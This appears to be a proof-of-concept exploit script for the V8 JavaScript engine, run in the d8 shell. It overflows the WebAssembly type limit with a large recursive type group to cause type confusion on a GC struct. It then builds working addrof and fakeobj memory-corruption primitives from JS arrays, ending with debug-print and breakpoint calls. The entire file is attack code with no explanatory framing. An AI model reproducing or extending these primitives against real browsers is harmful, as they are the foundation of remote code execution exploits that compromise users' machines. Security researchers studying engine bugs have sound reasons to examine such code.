new ArrayBuffer(0x1000000);

d8.file.execute('../..//test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();

const kV8MaxWasmTypes = 1000000;

// recursive group
builder.startRecGroup();
for (let i = 0; i < kV8MaxWasmTypes; i++) {
    builder.addStruct([makeField(kWasmI32, true)]);
}
builder.endRecGroup();

for (let i = 0; i < 6; i++) {
    builder.addStruct([makeField(kWasmI32, true)]);
}

// kV8MaxWasmTypes + 6
let pwn_struct = builder.addStruct([
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
    makeField(kWasmI32, true),
]);

let get_object = builder.addType(makeSig([kWasmExternRef], [kWasmI32]));
let set_object = builder.addType(makeSig([kWasmExternRef, kWasmI32], []));

// LEB encode 
// https://webassembly.github.io/spec/core/binary/values.html
builder.addFunction('set_object', set_object).addBody([
    kExprLocalGet, 0,
    kExprLocalGet, 1,
    kGCPrefix, kExprStructSet, ...wasmSignedLeb(pwn_struct), 6,
    // struct.set struct_index, struct, field_index, value
]).exportFunc();

builder.addFunction('get_object', get_object).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprStructGet, ...wasmSignedLeb(pwn_struct), 6,
]).exportFunc();

const instance = builder.instantiate();

let arr1 = [1.1, 1.2, 1.3, 1.4];
let arr2 = [{ }, 1.1, 1.2, 1.3];

function addrof(obj) {
    arr2[0] = obj;
    return instance.exports.get_object(arr2);
}

function fakeobj(addr) {
    instance.exports.set_object(arr2, addr);
    return arr2[0];
}

let addrof_arr1 = addrof(arr1);
let __arr1 = fakeobj(addrof_arr1);

console.log(addrof_arr1);
console.log(__arr1);
% DebugPrint(arr2);

% SystemBreak();
